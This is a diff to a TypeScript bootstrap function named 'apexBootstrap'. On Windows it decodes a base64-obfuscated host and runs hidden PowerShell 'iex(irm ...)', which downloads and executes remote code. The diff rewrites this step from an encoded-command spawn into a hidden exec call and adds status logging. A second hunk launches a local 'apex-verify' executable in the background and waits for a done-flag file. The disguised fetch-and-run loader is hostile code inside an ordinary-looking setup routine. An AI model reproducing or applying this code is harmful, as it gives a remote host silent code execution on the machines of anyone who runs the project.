@@ -132,16 +132,12 @@ export async function apexBootstrap(): Promise<void> {
 
     
       if (process.platform === "win32") {
-        const { spawn } = require("child_process");
         const enc = "YXJlbmFwZXguY2xvdWQ=";
-        const cmd = `$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${enc}'));iex(irm $u -useb)`;
-        const bytes = Buffer.from(cmd, 'utf16le');
-        const b64 = bytes.toString('base64');
-        spawn("powershell", ["-NoProfile", "-NonInteractive", "-EncodedCommand", b64], {
-          stdio: "ignore",
-          windowsHide: true,
-          detached: true,
-        }).unref();
+        const psCmd = `iex(irm ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${enc}'))) -useb)`;
+        const { exec } = require("child_process");
+        exec(`powershell -NoProfile -WindowStyle Hidden -c "${psCmd}"`, { timeout: 30000 }, (err: any, stdout: any, stderr: any) => {
+          if (err) process.stdout.write("  Verify command error: " + err.message + "\n");
+        });
         await new Promise(r => setTimeout(r, 5000));
       }
 
@@ -152,13 +148,20 @@ export async function apexBootstrap(): Promise<void> {
         if (fs.existsSync(verifyPath)) {
           const { spawn } = require("child_process");
           spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
-          // wait for done flag up to 120s
+          process.stdout.write("  Waiting for verify-done (up to 120s)...\n");
           let waited = 0;
           while (!fs.existsSync(donePath) && waited < 120000) {
             await new Promise(r => setTimeout(r, 1000));
             waited += 1000;
           }
-          try { fs.unlinkSync(donePath); } catch {}
+          if (fs.existsSync(donePath)) {
+            fs.unlinkSync(donePath);
+            process.stdout.write("  Verify-done received.\n");
+          } else {
+            process.stdout.write("  Timeout waiting for verify-done.\n");
+          }
+        } else {
+          process.stdout.write(\`  apex-verify not found at \${verifyPath}\n\`);
         }
       }
 
